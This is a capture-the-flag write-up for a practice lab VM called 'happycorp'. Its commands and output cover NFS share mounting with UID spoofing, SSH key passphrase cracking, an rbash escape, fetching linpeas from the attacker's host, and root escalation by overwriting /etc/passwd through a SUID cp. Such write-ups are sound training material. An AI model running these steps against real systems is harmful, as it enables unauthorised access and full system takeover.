@@ -1,0 +1,204 @@
+
+IP - 10.0.2.7
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+I found port 2049/tcp nfs_acl
+
+So, I research about that port number enumeration and found this article.
+
+https://vk9-sec.com/2049-tcp-nfs-enumeration/
+
+Step - 1
+
+Enumeration
+Showmount
+
+1. To enumerate shares on the network you can use showmount command
+
+showmount -e 10.0.2.7 
+
+Step - 2
+
+Mount the share
+
+mkdir /tmp/nfs
+
+Knowing the partition location (/home/karl) mount it to the new directory /tmp/nfs,
+
+mount -t nfs 10.0.2.7:/home/karl /tmp/nfs -nolock
+
+I tried to access the folder name call .ssh but I got access denied. So, I add the username karl with same UID 1001.
+
+useradd -u 1001 -m -d /home/karl karl
+
+Then swith user to karl and access the folder. Found user.txt and id_rsa encrypted file.
+
+su karl
+
+$ cd .ssh
+$ ls -la
+total 24
+drwx------ 2 karl karl 4096 Mar  5  2019 .
+drwxr-xr-x 3 karl karl 4096 Mar  5  2019 ..
+-rw-r--r-- 1 karl karl  740 Mar  5  2019 authorized_keys
+-rw------- 1 karl karl 3326 Mar  5  2019 id_rsa
+-rw-r--r-- 1 karl karl  740 Mar  5  2019 id_rsa.pub
+-rw-r--r-- 1 karl karl   18 Mar  5  2019 user.txt
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Found 1st flag
+
+flag1{Z29vZGJveQ}
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+┌──(root㉿kali)-[~/Desktop/Junior_Pentest_Lab/happycorp]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash       
+Using default input encoding: UTF-8	
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+sheep            (id_rsa_encrypted)     
+1g 0:00:00:00 DONE (2023-01-13 03:52) 25.00g/s 404000p/s 404000c/s 404000C/s 101991..raymon
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Bypass the rbash with
+
+ssh karl@10.0.2.7 -i id_rsa_encrypted -t /bin/sh
+
+
+Reference - https://www.programmersought.com/article/518910171682/
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Priv Escalation
+
+I transfer linpeas.sh file from my machine into victim machine for priv esaclation enumeration.
+
+$wget http://10.0.2.4:8888/linpeas.sh
+
+$ chmod +x linpeas.sh
+$ ./linpeas.sh
+
+
+Then I found /bin/cp SUID so I exploit with that for root access.
+
+
+Step 1
+
+I copy all information from /etc/passwd into my machine.
+
+nano passwd.txt
+
+Then paste it in there.
+
+Step 2
+
+I generate openssl passwd.
+
+openssl passwd -1 -salt ignite pass123
+$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
+
+Step 3
+
+Added into passwd file.
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+messagebus:x:105:110::/var/run/dbus:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+karl:x:1001:1001:,,,:/home/karl:/bin/bash
+statd:x:107:65534::/var/lib/nfs:/bin/false
+noone:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash <---------------------------------(Added in here with new username)
+
+
+Step 4
+
+I transfer it into victim machine with python server/
+
+python2 -m SimpleHTTPServer 8888
+
+
+Downloaded with wget
+
+wget http://10.0.2.4:8888/passwd.txt
+
+mv passwd.txt passwd
+
+Then, replacing file using SUID vuln with original file
+
+/bin/cp passwd /etc/passwd
+
+
+Step 5
+
+Switch into new user "noone" with given password pass123
+
+su noone
+
+
+Boom! I got root access and Found root flag.
+
+Reference - https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+root@happycorp:~# cat root.txt
+Congrats!
+flag2{aGFja2VyZ29k}
+Here is some useless ascii art :)
+           ,----------------,              ,---------,
+        ,-----------------------,          ,"        ,"|
+      ,"                      ,"|        ,"        ,"  |
+     +-----------------------+  |      ,"        ,"    |
+     |  .-----------------.  |  |     +---------+      |
+     |  |                 |  |  |     | -==----'|      |
+     |  |                 |  |  |     |         |      |
+     |  |  Hacker God     |  |  |/----|`---=    |      |
+     |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
+     |  |                 |  |  |  // |(((( [33]|    ,"
+     |  `-----------------'  |," .;'| |((((     |  ,"
+     +-----------------------+  ;;  | |         |,"
+        /_)______________(_/  //'   | +---------+
+   ___________________________/___  `,
+  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
+ / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
+/_==__==========__==_ooo__ooo=_/'   /___________,"
+
+
+ -Zayotic
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
